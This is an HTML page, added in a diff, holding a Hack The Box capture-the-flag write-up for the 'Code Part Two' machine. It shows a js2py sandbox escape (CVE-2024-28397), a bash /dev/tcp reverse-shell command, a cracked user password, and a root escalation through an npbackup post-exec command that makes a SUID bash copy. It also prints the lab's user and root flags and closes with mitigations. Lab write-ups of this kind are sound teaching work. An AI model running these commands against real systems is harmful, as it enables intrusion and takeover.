@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>voidwr - Code Part Two</title>
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+</head>
+<body>
+
+<!-- NAVIGATION -->
+<nav class="navbar">
+  <ul class="nav-menu">
+    <li><a href="/index.html" class="nav-link">🏠 Home</a></li>
+    <li><a href="/writeups.html" class="nav-link">📝 Writeups</a></li>
+    <li><a href="/about.html" class="nav-link">❤️ About</a></li>
+  </ul>
+</nav>
+
+<!-- WRITEUP CONTENT -->
+<section class="writeup-hero">
+  <div class="writeup-hero-overlay"></div>
+  <div class="writeup-hero-content">
+    <h1>Code Part Two</h1>
+    <p class="writeup-subtitle" style="color: rgb(120, 211, 120);">Easy</p>
+    <img src="media/logo.png" alt="Code Part Two Logo" class="writeup-machine-logo">
+  </div>
+</section>
+
+<section class="writeup-content">
+  <a href="/writeups.html" class="writeups-back-link">Back to Writeups</a>
+  
+  <div class="writeup-body">
+    <h2>Overview</h2>
+    <div class="writeup-banner-full-width">
+      <a href="https://labs.hackthebox.com/achievement/machine/2418005/692" target="_blank">
+        <img src="media/info.png" alt="Achievement Banner" class="writeup-banner-link">
+      </a>
+    </div>
+    <p>Code Part Two is an Easy machine and the descendant of the 
+      Code Part One machine on Hack the Box. Specifically, this machine targets vulnerabilities
+      such as human error, that have to do with when the developers 
+      allow arbitary code execution (javascript in this case) to run on the 
+      back end of the server without properly sandboxing it. Code Part two from the beginning
+      has a very straight forward exploitation technique to get user shell and then another 
+      straight forward technique to gain root shell.
+  </p>
+
+  <!-- RECONNAISSANCE SECTION -->
+    <h2>Reconnaissance</h2>
+    <p>Starting off, as with all HtB machines, we need to add the ip into our <code>/etc/hosts</code> file</p>
+    
+    <div class="gallery-item">
+        <img src="media/hosts.png" alt="/etc/hosts" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 1: /etc/hosts file entry</p>
+    </div>
+
+    <p>Afterwards, we do an nmap scan to find open ports for us to attack and output it in 
+      <code>recon/initial</code> for later reference if needed.
+    </p>
+
+    <div class="gallery-item">
+        <img src="media/nmap.png" alt="nmap scan" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 2: nmap scan</p>
+    </div>
+    
+    <p>Nmap returned port 22 and port 8000. Port 22 will be used later but port <code>8000</code> 
+      returned an http-alt. Normally, this port often means development servers, proxy servers, 
+      or other applications to run but in our case means there is an "http" server 
+      spinned up and served from this port. So let's visit <code>http://codeparttwo.htb:8000</code> 
+      from our browser and see what we can mess with.
+    </p>
+
+    <div class="gallery-item">
+        <img src="media/site.png" alt="Website Page" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 3: Initial website landing</p>
+    </div>
+
+    <p>
+      Right off we can spot a <code>Login</code>, <code>Register</code> and <code>Download App</code>.
+      From this we can infer that this website serves a database for handling users and passwords,
+      so that could be a good attack vector, but for now let's head to <code>Login</code>.
+    </p>
+
+    <div class="gallery-item">
+        <img src="media/site_login.png" alt="Login Page" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 4: Login page</p>
+    </div>
+
+    <p>
+      Trying all the normal SQL injection methods (<code>' OR 1=1 --</code>, <code>SELECT * FROM users</code>, etc)
+      did not seem to to work so we return to the index page and before we continue let's take a look on
+      what the app does in the backend so we press the download app button.
+    </p>
+
+    <div class="gallery-item">
+        <img src="media/site_download_app.png" alt="App download" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 5: Downloading the app</p>
+    </div>
+
+    <p>
+      We are met with an app.zip archive that we move to our working directory by using
+      <code>mv ~/Downloads/app.zip ~/writeups/codeparttwo/</code>. Now that we have it in our
+      working directory we can just use <code>unzip</code> to extract the contents of the archive.
+    </p>
+
+    <div class="gallery-item">
+        <img src="media/unziping_app.png" alt="Unziping App" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 6: Unziping app</p>
+    </div>
+
+    <p>
+      From <strong>Figure 6</strong> above we see an <code>instance/users.db</code>, so indeed this app has a 
+      form of a database, yet not usefull in this context because users will not be added in this 
+      db right now. We can also see an <code>app/app.py</code> which is the back end of our website.
+      We open it in <code>sublime text</code> and inspect the source code.
+    </p>
+    
+    <div class="gallery-item">
+        <img src="media/initial_app.png" alt="Code of app" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 7: app.py back end code</p>
+    </div>
+
+    <p>
+      The website is rendered by flask and very weirdly the developers left the app secret key 
+      on a downloadable version of the app, that we could potentially exploit to session hijack
+      or grab other users credentials but the machine has a far easier method of exploiting than
+      crafting session cookies.
+    </p>
+    
+    <div class="note-box">
+      <strong>DISCLAIMER:</strong> I haven't checked if you can indeed tamper with session cookies
+      by using the app.secret key in any way, so the above information 
+      of crafting such cookies may not be valid at all.
+    </div>
+    
+    <p>
+      Our main focus should be on the <code>import js2py</code>. In previous versions of js2py
+      there was a way of escaping the sandbox environment and execute arbitary commands on the
+      target, such us <code>'/bin/bash cat /etc/passwd'</code>.
+    </p>
+
+    <p>
+      So, let's move to the function that handles the js2py.
+    </p>
+    
+    <div class="gallery-item">
+        <img src="media/app_vulnerability.png" alt="js2py vulnerability" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 8: js2py function</p>
+    </div>
+    
+    <p>
+      We can see that when we hit a hypothetical <code>/run_code</code> route with the <code>POST</code>
+      (meaning there might be a button in our actual <code>/dashboard</code> route), the <code>run_code()</code>
+      function does <code>request.json.get('code')</code> and 'stores' it in a <code>code</code> variable.
+      That means the function requests our code as a <code>json</code> format and stores it for further use.
+    </p>
+
+    <p>
+      Secondly, in line <code>96</code> it evaluates or <strong>runs</strong> our code with <code>js2py.eval_js</code>
+      and this is our <storng>vulnerability</storng>. There is no sandboxing present, that means whatever we pass as long as
+      it is in a valid json format we can execute our code on the machine hosting the web app. 
+    </p>
+
+    <p>
+      You can also see the whole code of the website below
+    </p>
+
+    <button class="spoiler-toggle" data-spoiler-id="app.py" data-no-confirm="true" title="Click to reveal additional information">
+      app.py
+    </button>
+    <div class="spoiler-content" id="app.py">
+      <pre class="iframe-list-class" data-src="media/app.py"></pre>
+    </div>
+
+    <p>
+      Now that we know our vulnerability let's move back to the website 
+      and create an account to run some code.
+    </p>
+
+    <!-- EXPLOITATION SECTION -->
+    <h2>Exploitation</h2>
+    
+    <div class="gallery-item">
+        <img src="media/site_dashboard.png" alt="App dashboard" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 9: App dashboard</p>
+    </div>
+
+    <p>
+      Fortunately, there is no email validation either so we can just register with a random
+      email. After landing on the dashboard, there is indeed a run code button and save code, which
+      we do not need.
+    </p>
+
+    <p>
+      By searching for <code>js2py sandbox escape</code> we found
+      CVE-2024-28397 on NVD first, which is the vulnerability in js2py that allows for 
+      sandbox escape and remote code execution.
+    </p>
+
+    <button class="spoiler-toggle" data-spoiler-id="NVD" data-no-confirm="true" title="Click to reveal additional information">
+      <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28397" target="_blank" style="text-decoration: none; color: #9a9a9a;">CVE-2024-28397 NVD</a>
+    </button>
+
+    <p>
+      There is a PoC (Proof of Concept) for <code><strong>CVE-2024-28397</strong></code>
+      on github by user 
+      <strong id="user" class="inline-spoiler" hidden>Marven11</strong><button type="button" class="inline-spoiler-toggle" data-inline-target="user">
+         Show </button> and we can use it to get a reverse shell on the machine.
+    </p>
+
+    <button class="spoiler-toggle" data-spoiler-id="github" data-no-confirm="true" title="Click to reveal additional information">
+      <a href="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape" target="_blank" style="text-decoration: none; color: #9a9a9a;">CVE-2024-28397 PoC github</a>
+    </button>
+
+    <p>
+      We download the PoC on our working directory with <code>git clone</code> and then we 
+      look at what the code does.
+    </p>
+
+    <div class="gallery-item">
+        <img src="media/CVE-2024-28397_code.png" alt="PoC" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 9: CVE-2024-28397 PoC code</p>
+    </div>
+
+    <p>
+      We care about the payload of the PoC which is the part that is sent to the server 
+      to be executed. So, if we copy whatever is in the triple quotes and paste it to the server,
+      firstly the code will try to show the first line of /etc/passwd 
+      then the <code>;</code> is to run the next command whether the first one succeeds or not, 
+      and the second command is to open different calculators from different operating systems.
+      If any of that works it means that commands can be run on the server.
+    </p>
+
+    <div class="gallery-item">
+        <img src="media/exploit_test.png" alt="Exploit test" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 10: Testing Exploit</p>
+    </div>
+
+    <p>
+      When we press Run Code we get <code>Error:NoneType object is not callable</code> this has to do
+      with <code>Popen</code> in the code but if we had a working terminal now in the machine hosting
+      the app we would be able to see the first line of <code>/etc/passwd</code> 
+      and the calculator would open, so we know that the exploit works and we just need 
+      to tweak the code a bit to get a reverse shell.
+    </p>
+
+    <p>
+      So, if we change the <code>let cmd</code> payload to 
+      <code>'/bin/bash -c "bash -i >& /dev/tcp/OUR_IP/OUR_PORT 0>&1"'</code> 
+      and then we set up a netcat listener on our machine with <code>nc -lvnp OUR_PORT</code>, 
+      we should get a reverse shell when we run the code.
+    </p>
+    
+    <p>
+      What we try to do is 'tell' the server to run a bash command that is
+      <code>/bin/bash</code> where the bash shell is located, with the argument
+      <code>-c</code> which means in essence open a new shell and run the following command
+      as a string which is
+      <code>bash -i</code>. This means to open the shell as interactive so that it behaves as a 
+      normal terminal session and we redirect the stdout, stdin and stderr of the shell <code>>&</code> 
+      to our machine by using <code>/dev/tcp/OUR_IP/OUR_PORT</code>, which 
+      is a special path that behaves as a network connection. <code>0>&1</code>
+      is to redirect the stdin to the same place as stdout so that we can send commands 
+      from our terminal. Lastly, by opening an nc listener on our machine we can 'catch' the 
+      reverse shell and interact with it.
+    </p>
+
+    <div class="gallery-item">
+        <img src="media/running_exploit.png" alt="Running Exploit" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 11: Running Exploit</p>
+    </div>
+
+    <p>
+      Soon, we land in an unstable shell but all we want from here is to grab the users from the 
+      <code>users.db</code>. We could use <code>sqlite3</code> to interact with the database 
+      but a simple <code>cat</code> command works for now.
+    </p>
+
+    <div class="gallery-item">
+        <img src="media/usersdb_output.png" alt="Users DB" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 12: Grabbing users from users.db</p>
+    </div>
+
+    <p>
+      We see a user called <code>marco</code> with a password in md5 hash. 
+      We can crack the hash by heading to CrackStation and we get the password
+    </p>
+
+    <div class="gallery-item">
+        <img src="media/crackstation.png" alt="CrackStation" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 13: Cracking the hash</p>
+    </div>
+
+    <button class="spoiler-toggle" data-spoiler-id="user-password" title="Click to reveal user password">
+      🔒 User password
+    </button>
+    <div class="spoiler-content" id="user-password">
+      <div class="flag-box">
+        <strong>User Password:</strong> <code>sweetangelbabylove</code>
+      </div>
+    </div>
+
+    <p>
+      Now that we have the credentials we can ssh into the machine and get a more stable shell.
+    </p>
+      
+    <pre><code>ssh marco@codeparttwo.htb</code></pre>
+
+    <div class="gallery-item">
+        <img src="media/marco.png" alt="SSH into machine" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 14: SSH into the machine</p>
+    </div>
+
+    <p>
+      After inputting the password we do <code>ls</code> and we see the <code>user.txt</code>
+      file. So, we <code>cat user.txt</code> and get the user flag.
+    </p>
+
+
+    <button class="spoiler-toggle" data-spoiler-id="user.txt" title="Click to reveal flag">
+      🔒 user.txt
+    </button>
+    <div class="spoiler-content" id="user.txt">
+      <div class="flag-box">
+        <strong>Flag:</strong> <code>8513c00c18f99412efb088e2405a1730</code>
+        <div class="gallery-item">
+          <img src="media/userflag.png" alt="User Flag" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">User Flag</p>
+        </div>
+      </div>
+    </div>
+ 
+    <!-- PRIVILEGE ESCALATION SECTION -->
+    <h2>Privilege Escalation</h2>
+    <p>
+      Now for our root user when we did <code>ls</code> we saw a configuration file 
+      named <code>npbackup.conf</code>
+    </p>
+
+    <p>
+      <strong>NPBackup</strong> is a backup software that automates file backups both from CLI
+      use and GUI use. For our vertical privilege escalation we can abuse a misconfiguration 
+      in the <code>npbackup.conf</code> file. We can search for npbackup on google and 
+      head to the security section of the official github repository.
+    </p>
+
+    <div class="gallery-item">
+        <img src="media/npbackup_vuln.png" alt="npbackup vulnerability" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 15: NPBackup Vulnerability</p>
+    </div>
+
+    <p>
+      By running <code>sudo -l</code> we can see that the user <code>marco</code> can run 
+      <code>/usr/local/bin/npbackup-cli</code> as super user. So, by manipulating the post-exec
+      commands and the paths of the configuration file we can trick the npbackup-cli 
+      to execute a shell with root privileges.
+    </p>
+
+     <div class="gallery-item">
+        <img src="media/sudo-l.png" alt="sudo -l" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 16: sudo -l</p>
+    </div>
+
+
+
+    <button class="spoiler-toggle" data-spoiler-id="npbackup.conf" data-no-confirm="true" title="Click to reveal additional information">
+      npbackup.conf
+    </button>
+    <div class="spoiler-content" id="npbackup.conf">
+      <pre class="iframe-list-class" data-src="media/npbackup.txt"></pre>
+    </div>
+
+    <p>
+      By chaning the paths to <code>/usr/lib</code> and the post-exec commands to
+      <code>"/bin/cp /bin/bash /tmp/exploit; /bin/chmod +s /tmp/exploit"</code> we can make 
+      the npbackup-cli copy the bash binary to /tmp/exploit and then set the SUID bit on it, 
+      which means that whenever we run /tmp/exploit it will run with root 
+      privileges and give us a root shell.
+    </p>
+
+    <p>
+      What we do is we run the <code>cp</code> binary from the <code>/bin</code> directory and 
+      we copy with it the <code>bash</code> binary 
+      to <code>/tmp/exploit</code>. Then we run the <code>chmod</code> binary 
+      from the same directory and we set the SUID bit on <code>/tmp/exploit</code> with 
+      <code>+s</code>, that will change the SUID as the user we run from, in this case root since
+      we run the command with <code>sudo</code>.
+    </p>
+
+    <p>
+      Now all that's left is to run the <code>npbackup-cli</code> 
+      with the malicious configuration file, but unfortunatelly marco cannot modify it. So,
+      we transfer the existing config file to our machine with a python server, modify it and 
+      then transfer it back to the machine with the same method.
+    </p>
+
+    <div class="gallery-item">
+        <img src="media/npbackup_transfer.png" alt="npbackup.conf transfer" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 17: npbackup.conf transfer</p>
+    </div>
+
+    <p>
+      Let's search how to run a config file now with npbackup-cli 
+      so we do <code>/usr/local/bin/npbackup-cli -h</code>
+    </p>
+
+    <div class="gallery-item">
+        <img src="media/npbackup_help.png" alt="npbackup-cli help" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 18: npbackup-cli help</p>
+    </div>
+    
+    <p>
+      and find out that we have to run the command with <code>-b</code> for starting the backup 
+      and <code>-c</code> for specifying the config file.
+    </p>
+
+    <div class="gallery-item">
+        <img src="media/running_root_exploit.png" alt="npbackup-cli command" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 19: npbackup-cli command</p>
+    </div>
+
+    <p>
+      When the npbackup is done we do <code>/tmp/exploit -p</code> to run it
+      in privileged mode and become root.
+    </p>
+
+    <div class="gallery-item">
+        <img src="media/root_shell.png" alt="Root Shell" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 20: Root shell</p>
+    </div>
+
+    <p>
+      Lastly, we <code>cat /root/root.txt</code> to get the root flag and complete the machine.
+    </p>
+
+    <button class="spoiler-toggle" data-spoiler-id="root.txt" title="Click to reveal flag">
+      🔒 root.txt
+    </button>
+    <div class="spoiler-content" id="root.txt">
+      <div class="flag-box">
+        <strong>Flag:</strong> <code>96ee50e01c0ade989166de34dd977d82</code>
+        <div class="gallery-item">
+          <img src="media/rootflag.png" alt="Root Flag" class="gallery-image" onclick="openImageModal(this)">
+          <p class="image-caption">root.txt</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- CONCLUSION SECTION-->
+    <h2>Conclusion</h2>
+    <p>
+      Code Part Two is an easy machine that has a very straight forward exploitation path. 
+      The main vulnerability is the js2py sandbox escape that allows us to execute code on the server
+      and get a reverse shell, then we just need to grab the credentials from the users.db and ssh into
+      the machine. For privilege escalation we have to abuse a misconfiguration in npbackup that allows us
+      to execute commands as root and get a root shell.
+    </p>
+
+    <div class="mitigation-box">
+      <strong>✅ Mitigation user:</strong> for the js2py vulnerability, use
+      a separate OS process with python's subprocess paired with timeouts and memory limits or
+      prefer a sandboxed environment.
+    </div>
+
+    <div class="mitigation-box">
+      <strong>✅ Mitigation root:</strong> for the npbackup misconfiguration, 
+      ensure proper permissions and ownership of backup files and binaries, 
+      and make sure the configuration files are world readable only as per the
+      official github repository guidelines.
+    </div>
+
+
+    <!-- KEY FINDINGS SECTION -->
+    <h2>Key Findings</h2>
+    <table class="findings-table">
+      <thead>
+        <tr>
+          <th>Vulnerability</th>
+          <th>Severity</th>
+          <th>Impact</th>
+          <th>Remediation</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>js2py Sandbox Escape</td>
+          <td><span class="severity-critical">Critical</span></td>
+          <td>Remote code execution</td>
+          <td>Use a separate OS process or prefer a sandboxed environment</td>
+        </tr>
+        <tr>
+          <td>npbackup.conf Misconfiguration</td>
+          <td><span class="severity-critical">Critical</span></td>
+          <td>Privilege escalation</td>
+          <td>Make the configuration file world readable only</td>
+        </tr>
+        <tr>
+          <td>Unencrypted database</td>
+          <td><span class="severity-high">High</span></td>
+          <td>Unauthorized access</td>
+          <td>Encrypt with SQLCipher or similar</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <!-- REFERENCES SECTION -->
+    <h2>References & Resources</h2>
+    <div class="references-grid">
+      <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28397" target="_blank" class="reference-card">
+        <div class="reference-icon">🌐</div>
+        <h3>NVD</h3>
+        <p>NVD - CVE-2024-28397. (n.d.). https://nvd.nist.gov/vuln/detail/CVE-2024-28397</p>
+        <span class="reference-link">nvd.nist.gov</span>
+      </a>
+      <a href="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape" target="_blank" class="reference-card">
+        <div class="reference-icon">🌐</div>
+        <h3>GitHub</h3>
+        <p>Marven. (n.d.). GitHub - Marven11/CVE-2024-28397-js2py-Sandbox-Escape: 
+          CVE-2024-28397: js2py sandbox escape, bypass pyimport restriction. 
+          GitHub. https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape</p>
+        <span class="reference-link">github.com</span>
+      </a>
+      <a href="https://github.com/netinvent/npbackup/security" target="_blank" class="reference-card">
+        <div class="reference-icon">🌐</div>
+        <h3>Netinvent GitHub</h3>
+        <p>Netinvent. (n.d.). 
+          Build software better, together. GitHub. https://github.com/netinvent/npbackup/security</p>
+        <span class="reference-link">github.com</span>
+      </a>
+    </div>
+
+    <!-- END TEMPLATE SECTIONS -->
+  </div>
+</section>
+
+<script src="/assets/js/main.js"></script>
+<script src="/assets/js/writeups.js"></script>
+<script>
+  document.getElementById('app.py').oncopy = e => e.preventDefault();
+  document.getElementById('app.py').oncut = e => e.preventDefault();
+</script>
+</body>
+</html>
